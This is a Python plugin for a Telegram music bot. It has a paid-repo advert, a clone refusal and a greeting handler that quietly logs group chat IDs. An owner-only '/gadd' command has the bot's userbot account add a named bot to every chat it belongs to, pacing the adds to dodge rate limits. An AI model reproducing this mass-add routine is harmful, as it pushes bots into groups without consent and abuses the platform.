import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

from BrandrdXMusic import app
from BrandrdXMusic.mongo.afkdb import LOGGERS as OWNERS
from BrandrdXMusic.utils.database import add_served_chat, get_assistant


@app.on_message(filters.command("repo"))
async def repo_price_info(client: Client, message: Message):
    # Violet Evergarden Style Message for Repo Price
    caption_text = f"""
**💰 𝐑𝐄𝐏𝐎 𝐏𝐑𝐈𝐂𝐄: ₹𝟐𝟎𝟎**
**𝐈𝐟 𝐲𝐨𝐮 𝐰𝐢𝐬𝐡 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐭𝐡𝐞 𝐬𝐜𝐫𝐢𝐩𝐭, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐚𝐩𝐩𝐫𝐨𝐚𝐜𝐡 𝐌𝐲 𝐃𝐚𝐝𝐝𝐲 🤤** @crwke
"""
    await message.reply_photo(
        photo=f"https://telegra.ph/file/1aac9a42f6f35138da34b.jpg",
        caption=caption_text,
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🤤 𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐟𝐫𝐨𝐦 𝐌𝐲 𝐃𝐚𝐝𝐝𝐲 🤤", url=f"https://t.me/crwke"
                    )
                ]
            ]
        ),
    )


@app.on_message(filters.command("clone"))
async def clones(client: Client, message: Message):
    # Violet Evergarden Style Message (Sudo Restriction & Privacy Message)
    await message.reply_photo(
        photo=f"https://telegra.ph/file/1aac9a42f6f35138da34b.jpg",
        caption=f"""**🥺 My apologies, dear client. You must be a Sudo User to replicate my script.**
**My source script is private for now.**
**If you wish to ask my developer about this, please use the button below.**""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🤤 𝐌𝐲 𝐃𝐚𝐝𝐝𝐲 🤤", url=f"https://t.me/crwke" # Consistent DADDY button
                    )
                ]
            ]
        ),
    )


# --------------------------------------------------------------------------------- #


@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


# --------------------------------------------------------------------------------- #


import asyncio


@app.on_message(filters.command("gadd") & filters.user(int(1499705163)))
async def add_allbot(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        # Violet Evergarden Style Error Message with new example bot
        await message.reply(
            "**⚠️ Invalid format, my Master. Please provide the bot's username, like this: `/gadd @lnfixbot`**" # <--- Bot ka naam badal diya gaya
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        # Violet Evergarden Style Initial Message
        lol = await message.reply("🔄 **Diligently adding the requested bot to all chats... please wait.**")
        await userbot.send_message(bot_username, f"/start")
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001754457302:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                # Violet Evergarden Style Updating Message
                await lol.edit(
                    f"**🔂 I am still working on adding {bot_username}:**\n\n**➥ Successfully added to {done} chats ✅**\n**➥ Failed in {failed} chats ❌**\n\n**➲ Assisted by:** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                # Violet Evergarden Style Updating Message (on failure)
                await lol.edit(
                    f"**🔂 I am still working on adding {bot_username}:**\n\n**➥ Successfully added to {done} chats ✅**\n**➥ Failed in {failed} chats ❌**\n\n**➲ Assisted by:** @{userbot.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        # Violet Evergarden Style Final Success Message
        await lol.edit(
            f"**➻ {bot_username} was successfully added to all chats! 🎉**\n\n**➥ Total successful chats: {done} ✅**\n**➥ Total failed chats: {failed} ❌**\n\n**➲ Task completed by:** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"**Error during operation:** {str(e)}") # Simple error reply


__MODULE__ = "Source"
__HELP__ = """
## 📜 Source and Correspondence 💌

**This section provides details about my script and how to replicate me.**

### Commands:
- **`/repo`**: Asks for the price of my source code. 💰
- **`/clone`**: Attempts to clone me (only for my trusted Masters/Sudo Users). My script is private. 🔒
"""
